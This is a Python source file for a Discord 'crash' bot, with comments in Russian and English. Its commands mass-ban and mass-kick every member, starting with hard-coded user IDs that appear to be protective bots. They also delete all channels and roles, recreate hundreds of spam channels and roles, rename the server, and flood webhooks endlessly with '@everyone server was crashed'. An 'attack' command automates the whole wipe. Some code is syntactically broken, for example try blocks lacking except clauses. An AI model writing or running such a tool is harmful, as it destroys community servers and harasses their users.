import os, aiohttp, configparser
try:
    import discord
except:
    os.system("pip3 install discord.py==1.7.3")
from discord.ext import commands
from chardet.universaldetector import UniversalDetector

config = configparser.ConfigParser()
detector = UniversalDetector()
with open('config.ini', 'rb') as fh:
    for line in fh:
        detector.feed(line)
        if detector.done:
            break
    detector.close()
config.read("config.ini", encoding=detector.result["encoding"])

prefix = '$'
spam_message = '@everyone server was crashed'
spam_role_name = "crashed"
spam_channel_name = 'crashed'
token = ' '
name = "crashed"
client = commands.Bot(prefix, intents=discord.Intents.all())
client.remove_command( 'help' )
client.spam = False

async def chs(guild):
    try:
        for i in guild.channels:
            try:
                await i.delete()
            except:
                pass
        for timer in range(250):
            await guild.create_text_channel(spam_channel_name)

async def rls(guild):
    for i in range(1, 501):
        try: await guild.create_role(name=spam_role_name, colour=discord.Colour.from_rgb(0, 0, 1))
        try: await guild.create_text_channel(spam_channel_name)

@client.command()
async def banall(ctx):
    guild=ctx.guild
    await bns(guild, ctx.author)

@client.command()
async def kickall(ctx):
    guild=ctx.guild
    await kck(guild, ctx.author)

@client.command()
async def clear(ctx):
    new=await ctx.channel.clone()
    await new.edit(position=ctx.channel.position)
    await ctx.channel.delete()

@client.command()
async def rename(ctx):
    with open('icon.PNG', 'rb') as f:
        icon = f.read()
        await ctx.guild.edit(name=name, icon=icon)

@client.command()
async def send(ctx, member: discord.Member, *, text):
    await ctx.message.delete()
    try:
        await member.send(text)
    except:
        await ctx.send(f'Не смог отправить сообщение!')


async def kck(guild, mem=None):
    lavan=guild.get_member(704967695036317777)
    cp=guild.get_member(752367350657056851)
    wick=guild.get_member(536991182035746816)
    sbd=guild.get_member(856495339028873216)
    sec=guild.get_member(651095740390834176)
    akbs=[lavan, cp, wick, sbd, sec]
    for akb in akbs:
        if akb: 
            try: await akb.kick()
            except: pass
    st=''
    for m in guild.members:
        if m.id != client.user.id:
            try: await m.kick()
            except: st+=f'{m}  ID: {m.id}, \n'
    with open("not_kicked.txt", 'w', encoding='utf-8') as f: f.write(st); f.close()
    location=os.getcwd()
    path = os.path.join(location, "not_kicked.txt")
    try: await mem.send(file=discord.File(str(path)))
    except Exception as e: print(e)

async def bns(guild, mem=None):
    lavan=guild.get_member(704967695036317777)
    cp=guild.get_member(752367350657056851)
    wick=guild.get_member(536991182035746816)
    sbd=guild.get_member(856495339028873216)
    sec=guild.get_member(651095740390834176)
    akbs=[lavan, cp, wick, sbd, sec]
    for akb in akbs:
        if akb: 
            try: await akb.ban()
            except: pass
    st=''
    for m in guild.members:
        if m.id != client.user.id:
            try: await m.ban()
            except: st+=f'{m}  ID: {m.id}, \n'
    with open("not_kicked.txt", 'w', encoding='utf-8') as f: f.write(st); f.close()
    location=os.getcwd()
    path = os.path.join(location, "not_kicked.txt")
    try: await mem.send(file=discord.File(str(path)))
    except Exception as e: print(e)

@client.event
async def on_ready():
    print(client.guilds)
    print(f'Бот запущен как {client.user}  ID: {client.user.id}')

@client.event
async def on_error(h, g):
    try:
        print(h)
        print(g)
    except: pass

@client.event
async def on_command_error(ctx, err):
    if isinstance(err, commands.errors.BotMissingPermissions):
        await ctx.message.delete()
        await ctx.author.send(embed=discord.Embed(title='Error', description=f"Bot didnt have perms: {' '.join(err.missing_perms)}\nGive them for all functions", color=discord.Colour.from_rgb(255, 0, 0)))
    elif isinstance(err, commands.CommandOnCooldown):
        await ctx.message.delete()
        await ctx.author.send(embed=discord.Embed(title='Error', description=f"Wait, cooldown for this coomand {ctx.command}\nYou need wait {err.retry_after:.2f} sec", color=discord.Colour.from_rgb(255, 0, 0)))
    elif isinstance( err, commands.MissingRequiredArgument ):
        await ctx.author.send(embed=discord.Embed(title='Error', description=f"No arguments", color=discord.Colour.from_rgb(255, 0, 0)))

@client.event
async def on_guild_channel_create(channel):
    if channel.name == spam_channel_name and isinstance(channel, discord.TextChannel):
        webhook = await channel.create_webhook(name = "crash")
        webhook_url = webhook.url
        async with aiohttp.ClientSession() as session:
            webhook = discord.Webhook.from_url(str(webhook_url), adapter=discord.AsyncWebhookAdapter(session))
            while True:
                try: 
                    await webhook.send(spam_message, embed=discord.Embed(title=spam_message, content=spam_message), username=spam_message)
                except:
                    pass

@client.command()
async def attack(ctx):
    guild=ctx.guild
    await bns(guild, ctx.author)
    try: await guild.edit(name=name)
    except Exception as e: print(e)
    await chs(guild)
    await rls(guild)

@client.command()
@commands.cooldown(1, 120, commands.BucketType.user)
async def roles(ctx):
    for g in ctx.guild.roles:
        try:
            await g.delete()
        except:
            pass
    while(500):
        try:
            await ctx.guild.create_role(name=spam_role_name, colour=discord.Colour.from_rgb(0, 0, 1))
        except:
            return

@client.command()
@commands.cooldown(1, 300, commands.BucketType.user)
async def ban(ctx):
    for o in ctx.guild.members:
        if o.id != client.user.id:
            try:
                await o.ban()
            except:
                pass

@client.command()
@commands.cooldown(1, 30, commands.BucketType.user)
async def channels(ctx):
    try:
        for i in ctx.guild.channels:
            try:
                await i.delete()
            except:
                pass
        for i in range(250):
            await ctx.guild.create_text_channel(spam_channel_name)
    except:
        pass

@client.command()
async def spamwebhooks(ctx):
    if ctx.guild.channels <= 50:
        client.spam = True
        await ctx.send("spam")

@client.command()
async def help(ctx):
    await ctx.message.delete()
    try:
        await ctx.author.send(f'''
{prefix}roles  - del all roles and spam them
{prefix}banall  - ban all
{prefix}channels  - del all channels and spam them
{prefix}attack  - auto crash
{prefix}ban - ban user
{prefix}kickall - kick all
{prefix}clear - clear chat
{prefix}rename - rename server and change ico
{prefix}send - send message to user
{prefix}spamwebhooks - spam webhooks
''')
    except:
        await ctx.send('Open dm')

client.run(config['crash']['token'])
